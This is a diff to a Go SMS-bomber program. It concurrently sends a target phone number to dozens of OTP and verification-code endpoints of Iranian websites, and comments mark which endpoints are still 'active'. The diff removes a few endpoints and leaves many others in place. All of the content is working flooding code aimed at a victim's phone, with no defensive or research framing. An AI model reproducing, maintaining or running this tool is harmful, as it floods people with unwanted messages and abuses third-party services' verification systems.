@@ -138,16 +138,6 @@ func main() {
 		go sms("https://appapi.sms.ir/api/app/auth/sign-up/verification-code", map[string]interface{}{
 			"": phone,
 		}, ch)  // add site
-		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // add site   // active ✅
-		s26 := fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone)
-		go sms("https://api.basalam.com/user", map[string]interface{}{
-			s26: phone,
-		}, ch)  // active ✅
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // active ✅
 		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
@@ -220,9 +210,6 @@ func main() {
 		go sms("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)   // add site
-		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
-			"phone": phone,
-		}, ch)   // add site
 		go sms("https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
@@ -244,9 +231,7 @@ func main() {
 		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-		go sms("https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)    // add site
+
 		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)    // add site
@@ -275,9 +260,6 @@ func main() {
 		go sms("https://core.gap.im/v1/user/add.json", map[string]interface{}{
 			"mobile": phone,
 		}, ch) // dar khate 602 neveshteh shodeh.
-		go sms("https://caropex.com/api/v1/user/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)    // add site
 		go sms("https://hamrahsport.com/send-otp", map[string]interface{}{
 			"cell": phone,
 		}, ch)    // add site
